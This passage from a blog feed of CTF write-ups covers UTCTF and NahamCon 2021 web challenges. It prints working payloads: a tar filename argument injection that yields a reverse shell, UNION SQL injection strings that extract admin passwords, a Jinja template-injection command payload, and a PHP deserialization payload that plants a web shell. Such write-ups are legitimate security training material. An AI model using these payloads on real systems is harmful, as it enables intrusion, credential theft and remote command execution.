src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/2.png?raw=true"></p><p>If you upload any file, you can see that only the <code>.tar</code> extension can be uploaded. Probably I need to make RCE happen when i unpack the tar file. When unpack the tar file, I can execute file <code>using --to-command</code> option :)</p><ul><li>Scenario</li></ul><ol><li>I compress the reverse shell code to tar file and I upload in server.</li><li>If you upload the tar file, you can see the newly created file name.</li><li>If you upload the created file again by name, it will be unpack and the file will be executed. Obviously, you need to add the <code>--to-command</code> option at this time.</li><li>And since the last in the file must be <code>.tar</code>, you can bypass it using the <code>--exclude</code> option.</li></ol><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/3.png?raw=true"></p><p>After uploading the tar file, you can see a file named <code>pocas__bf9d0.tar</code> was created :) Now, When you unpack the <code>pocas__bf9d0.tar</code> file, you can execute the reverse shell file.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: web2.utctf.live:8123</span><br><span class="line">Content-Length: 1566</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarytCvRhaPJjhVCXGrN</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytCvRhaPJjhVCXGrN</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;pocas__bf9d0.tar --to-command&#x3D;python3$&#123;IFS&#125;pocas.py --exclude&#x3D;pocas.tar&quot;</span><br><span class="line">Content-Type: application&#x2F;x-tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytCvRhaPJjhVCXGrN--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>I used the <code>--to-command</code>/<code>--exclude</code> option as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 80</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line"># pwd</span><br><span class="line">&#x2F;tmp&#x2F;extracts</span><br><span class="line"># cat &#x2F;flag.txt</span><br><span class="line">utflag&#123;bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk&#125;</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>You can see that it is unpacked, and the file is executed to get the shell :)</p><blockquote><p>FLAG : utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NahamCon CTF 2021 Write Up</title>
      <link href="2021/03/14/2021-03-14-NahamCon-CTF-2021/"/>
      <url>2021/03/14/2021-03-14-NahamCon-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Asserted-283-pts"><a href="#Web-Asserted-283-pts" class="headerlink" title=" (Web) Asserted [283 pts]"></a><span style="color:#21C587"></span> (Web) Asserted [283 pts]</h2><blockquote><p>Asserted challenge is get flag using LFI and assert() vuln</p></blockquote><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/1.png?raw=true"></p><p>Go into the challenge and u will see a simple blog and <code>ABOUTS US</code>/<code>SCHEDULE</code>/<code>GALLERY</code>/<code>BLOG</code>/<code>CONTACTS</code> function.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/2.png?raw=true"></p><p>So once I went into <code>ABOUT DS</code> and looked at <code>URL</code>, I could see that the file was fetched using the <code>page</code> parameter. Here I thought that I could do LFI attack using <code>PHP Wrapper</code>.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/3.png?raw=true"></p><p>When I read the index.php file using <code>PHP Wrapper</code>, I could see that it worked.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Saving ourselves from any kind of hackings and all</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;home.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>If you look at the index.php code, you can see that it is using the assert() function. So you can use the assert() function vulnerability to read the flag with <code>RCE</code>.</p><blockquote><p>FLAG : flag{85a25711fa6e111ed54b86468a45b90c}</p></blockquote><hr><h2 id="Web-Bad-Blog-469-pts"><a href="#Web-Bad-Blog-469-pts" class="headerlink" title=" (Web) Bad Blog [469 pts]"></a><span style="color:#21C587"></span> (Web) Bad Blog [469 pts]</h2><blockquote><p>Bad Blog challenge is get the admin account using the SQL Injection of insert statements.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/1.png?raw=true"></p><p>Go into the challenge and u will see a login form.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/2.png?raw=true"></p><p>When u register and login, u will see the posts and <code>add post</code>/<code>Logged in</code> as a function.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/3.png?raw=true"></p><p>I created a post and was able to read it with <code>/post/:title</code>. I thought there would be an xss or ssti vuln here. but it didnâ€™t happen at all.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/5.png?raw=true"></p><p>I found something interesting in <code>/profile</code>. Whenever someone read my post, I creat a log using <code>User-Agent</code>. I thought I was save log using a database, So, I try SQL Injection using <code>User-Agent</code> in <code>/post:title</code>.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/6.png?raw=true"></p><p>When i passed the value of <code>User-Agent</code>, I could see a db error :) I was able know using sqlite3 in server and using insert statements. So, Iâ€™ll try union SQL Injection attack of insert statements in sqlite 3!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent : a&#39;), (5, 2, (select group_concat(sql) from sqlite_master))--</span><br><span class="line">Output     : CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(40), password VARCHAR(40), PRIMARY KEY (id), UNIQUE (username) ),CREATE TABLE post ( id INTEGER NOT NULL, title VARCHAR(40), author_id INTEGER, date VARCHAR(40), category VARCHAR(40), image VARCHAR(60), thumbnail VARCHAR(60), heading VARCHAR(200), content VARCHAR(10000), PRIMARY KEY (id), UNIQUE (title), FOREIGN KEY(author_id) REFERENCES user (id) ),CREATE TABLE visit ( id INTEGER NOT NULL, post_id INTEGER, user_id INTEGER, ua VARCHAR(100), PRIMARY KEY (id), FOREIGN KEY(post_id) REFERENCES post (id), FOREIGN KEY(user_id) REFERENCES user (id) )</span><br><span class="line"></span><br><span class="line">User-Agent : a&#39;),(5,2,(select group_concat(username) from user))--</span><br><span class="line">Output     : a,admin</span><br><span class="line"></span><br><span class="line">User-Agent : a&#39;),(5,2,(select group_concat(password) from user))--</span><br><span class="line">Output     : J3H8cqMNWxH68mTj,a</span><br></pre></td></tr></table></figure><p>Using the payload above, I was able to get an admin account. Now, login as an administrator to get the flag.</p><blockquote><p>FLAG : flag{8b31eecb1831ed594fa27ef5b431fe34}</p></blockquote><hr><h2 id="Web-AgentTester-463-pts"><a href="#Web-AgentTester-463-pts" class="headerlink" title=" (Web) AgentTester [463 pts]"></a><span style="color:#21C587"></span> (Web) AgentTester [463 pts]</h2><blockquote><p>AgentTester challenge is get the admin account using SQL Injection and after login get the flag using SSTI.</p></blockquote><p>Frist, Iâ€™ll analysis source code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_uwsgi_websocket <span class="keyword">import</span> GeventWebSocket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> backend.backend <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ws = GeventWebSocket(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    success = request.args.get(<span class="string">&quot;success&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    error = request.args.get(<span class="string">&quot;error&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;templates/index.html&quot;</span>,</span><br><span class="line">        user=g.user,</span><br><span class="line">        success=success,</span><br><span class="line">        error=error,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/debug&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    sessionID = session.get(<span class="string">&quot;id&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> sessionID == <span class="number">1</span>:</span><br><span class="line">        code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&lt;h1&gt;Safe Debug&lt;/h1&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(code)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not allowed.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile/&lt;int:user_id&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>(<span class="params">user_id</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> g.user.<span class="built_in">id</span> == user_id:</span><br><span class="line">        user_now = User.query.get(user_id)</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            about = request.form.get(<span class="string">&quot;about&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">            email = request.form.get(<span class="string">&quot;email&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> email:</span><br><span class="line">                user_now.email = email</span><br><span class="line">            <span class="keyword">if</span> about:</span><br><span class="line">                user_now.about = about</span><br><span class="line">            <span class="keyword">if</span> email <span class="keyword">or</span> about:</span><br><span class="line">                db.session.commit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(</span><br><span class="line">            url_for(<span class="string">&quot;home&quot;</span>, error=<span class="string">&quot;You are not authorized to access this resource.&quot;</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;templates/profile.html&quot;</span>,</span><br><span class="line">        user=user_now,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@ws.route(<span class="params"><span class="string">&quot;/req&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">with</span> app.request_context(ws.environ):</span><br><span class="line">        sessionID = session.get(<span class="string">&quot;id&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sessionID:</span><br><span class="line">            ws.send(<span class="string">&quot;You are not authorized to access this resource.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        uAgent = ws.receive().decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> uAgent:</span><br><span class="line">            ws.send(<span class="string">&quot;There was an error in your message.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            query = db.session.execute(</span><br><span class="line">                <span class="string">&quot;SELECT userAgent, url FROM uAgents WHERE userAgent = &#x27;%s&#x27;&quot;</span> % uAgent</span><br><span class="line">            ).fetchone()</span><br><span class="line"></span><br><span class="line">            uAgent = query[<span class="string">&quot;userAgent&quot;</span>]</span><br><span class="line">            url = query[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            ws.send(<span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> uAgent <span class="keyword">or</span> <span class="keyword">not</span> url:</span><br><span class="line">            ws.send(<span class="string">&quot;Query error.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        subprocess.Popen([<span class="string">&quot;node&quot;</span>, <span class="string">&quot;browser/browser.js&quot;</span>, url, uAgent])</span><br><span class="line"></span><br><span class="line">        ws.send(<span class="string">&quot;Testing User-Agent: &quot;</span> + uAgent + <span class="string">&quot; in url: &quot;</span> + url)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Frist, You can see <code>/debug</code>. When <code>sessionID</code> is 1, you can see that the <code>code</code> parameter value is received and passed to the template. Here, because there is no verification of <code>code</code> parameter, a SSTI vulnerability occurs. But, because the <code>sessionID</code> must be 1. So, we need find out the admin account :(</p><p>Second, You can see <code>/req</code>. You can see that the value of <code>User-Agent</code> is received and put in the <code>SQL query statement</code>. Here, because there is no verification of User-Agent, a SQL Injection vulnerability occurs. :)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line">service nginx start</span><br><span class="line">sleep 3</span><br><span class="line"></span><br><span class="line">export PORT&#x3D;&#39;80&#39;</span><br><span class="line">export ADMIN_BOT_USER&#x3D;&quot;admin&quot;</span><br><span class="line">export ADMIN_BOT_PASSWORD&#x3D;&quot;&lt;REDACTED&gt;&quot;</span><br><span class="line"></span><br><span class="line">export CHALLENGE_NAME&#x3D;&quot;AgentTester&quot; &amp;&amp; export CHALLENGE_FLAG&#x3D;&quot;&lt;REDACTED&gt;&quot;\</span><br><span class="line">    &amp;&amp; uwsgi --ini app.ini</span><br></pre></td></tr></table></figure><p>Third, The flag exists in the environment variable CHALLENGE_FLAG.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/1.png?raw=true"></p><p>Go into the challenge and u will see a login form. So, after register, login.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/2.png?raw=true"></p><p>I was login and saw <code>User-Agent</code> input form.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/3.png?raw=true"></p><p>You can see that an error occurs because single quotes are sent as the value of <code>User-Agent</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select &#39;a&#39;, group_concat(sql) from sqlite_master --</span><br><span class="line">&#39; union select &#39;a&#39;, group_concat(username) from user --</span><br><span class="line">&#39; union select &#39;a&#39;, group_concat(password) from user --</span><br><span class="line"></span><br><span class="line">admin account</span><br><span class="line">username : admin</span><br><span class="line">password : *)(@skdnaj238374834**__**&#x3D;</span><br></pre></td></tr></table></figure><p>Using the payload above, I was able to get an admin account. Now, you can login as an administrator and read the environment variable using the SSTI vuln.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>Letâ€™s use the payload above.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/6.png?raw=true"><br>If you run the <code>ls</code> command using the payload above, you can see that it works.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/NahamConCTF/agenttester/5.png?raw=true"><br>Finally, when you read all the environment variables using the <code>export</code> command, you can see that there are flag in the environment variables.</p><blockquote><p>FLAG : flag{fb4a87cfa85cf8c5ab2effedb4ea7006}</p></blockquote><hr><h2 id="Web-Cereal-and-Milk-491-pts"><a href="#Web-Cereal-and-Milk-491-pts" class="headerlink" title=" (Web) Cereal and Milk [491 pts]"></a><span style="color:#21C587"></span> (Web) Cereal and Milk [491 pts]</h2><blockquote><p>Cereal and Milk challenge is get the flag using simple php object injection</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;log.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CerealAndMilk</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logs</span> = <span class="string">&quot;request-logs.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cereal</span> = <span class="string">&#x27;Captain Crunch&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$milk</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">processed_data</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Deserilized data:&lt;br&gt; Coming soon.&quot;</span>;</span><br><span class="line">       <span class="comment"># echo print_r($output);</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cereal_and_milk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;cereal . <span class="string">&quot; is the best cereal btw.&quot;</span>;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;serdata&#x27;</span>];</span><br><span class="line"><span class="variable">$output</span> = unserialize(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> CerealAndMilk;</span><br><span class="line"><span class="variable">$app</span> -&gt; cereal_and_milk(<span class="variable">$output</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Looking at index.php, you can see that the log.php file is loaded and the value of the serdata parameter is retrieved and deserialized.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$request_log</span> = fopen(<span class="keyword">$this</span>-&gt;logs , <span class="string">&quot;a&quot;</span>);</span><br><span class="line">            fwrite(<span class="variable">$request_log</span>, <span class="keyword">$this</span>-&gt;request);</span><br><span class="line">            fwrite(<span class="variable">$request_log</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            fclose(<span class="variable">$request_log</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>If you look at log.php, you can see that a file is created using the values of <code>logs</code> and <code>requests</code>. And since logs are the file name and request is the contents of the file, you just need to upload the web shell using php object injection :)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;log&quot;:3:&#123;s:4:&quot;logs&quot;;s:9:&quot;pocas.php&quot;;s:7:&quot;request&quot;;s:29:&quot;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&quot;;s:4:&quot;milk&quot;;s:5:&quot;pocas&quot;&#125;</span><br></pre></td></tr></table></figure><p>I wrote the payload as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;ls</span><br><span class="line"></span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x    1 apache   apache        4096 Mar 15 04:35 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Mar 12 00:42 ..</span><br><span class="line">-rw-r--r--    1 apache   apache          45 Dec  2 21:45 index.html</span><br><span class="line">-rw-r--r--    1 apache   apache        4577 Mar 12 00:41 index.php</span><br><span class="line">-rw-r--r--    1 apache   apache         257 Mar 12 00:41 log.php</span><br><span class="line">drwxr-xr-x    1 apache   apache        4096 Mar 12 00:42 ndwbr7pVKNCrhs-CerealnMilk</span><br><span class="line">-rw-r--r--    1 apache   apache          31 Mar 15 04:35 pocas.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;ls%20ndwbr7pVKNCrhs-CerealnMilk</span><br><span class="line"></span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;cat%20ndwbr7pVKNCrhs-CerealnMilk&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line">flag&#123;70385676892a2a813a666961ddd6f899&#125;</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : flag{70385676892a2a813a666961ddd6f899}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> SQL Injection </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2021 Write Up</title>
      <link href="2021/03/08/2021-03-08-zer0pts-CTF-2021/"/>
      <url>2021/03/08/2021-03-08-zer0pts-CTF-2021/</url>
      
